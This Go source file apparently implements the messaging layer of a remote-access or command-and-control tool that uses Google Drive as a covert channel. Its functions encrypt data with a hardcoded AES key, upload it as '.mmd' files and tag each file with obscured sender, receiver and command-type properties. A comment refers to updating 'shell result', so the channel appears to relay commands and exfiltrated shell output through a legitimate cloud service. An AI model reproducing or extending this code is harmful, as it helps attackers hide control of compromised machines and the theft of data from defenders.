package toolkits

import (
	"io"
	"google.golang.org/api/drive/v3"
	"bytes"
)

const MessageKey = "123456781234567812345678"

func UpdateMessage(srv *drive.Service, fileId string, recvId string, sendId string,
	cmdType string, messageMedia io.Reader)(*drive.File, error){
	// update shell result
	newFile := &drive.File{
		//Description: time.Now().Format("2006-01-02 15:04:05"),
		AppProperties: map[string]string{
			"los":	sendId,
			"owe":	recvId,
			"typ":	cmdType,
		},
	}

	nf, err := srv.Files.Update(fileId, newFile).Media(messageMedia).Do()
	return nf, err
}

func UpdateMessage2(srv *drive.Service, fileId string, recvId string, sendId string,
	cmdType string, data []byte)(*drive.File, error){
	// 加密数据
	sendData := AesEncrypt(data, MessageKey)
	messageMedia := bytes.NewBuffer(sendData)

	newFile := &drive.File{
		AppProperties: map[string]string{
			"los":	sendId,
			"owe":	recvId,
			"typ":	cmdType,
		},
	}

	nf, err := srv.Files.Update(fileId, newFile).Media(messageMedia).Do()
	return nf, err
}

func SendMessage(srv *drive.Service, recvId string, sendId string,
	cmdType string, data []byte) (*drive.File, error) {
	// 加密数据
	sendData := AesEncrypt(data, MessageKey)
	messageMedia := bytes.NewBuffer(sendData)

	// 上传数据
	newFile := &drive.File{
		Name: recvId+".mmd",
		MimeType: "application/octet-stream",
		AppProperties: map[string]string{
			"los":	sendId,
			"owe":	recvId,
			"typ":	cmdType,
		},
	}

	nf, err := srv.Files.Create(newFile).Media(messageMedia).Do()
	return nf, err
}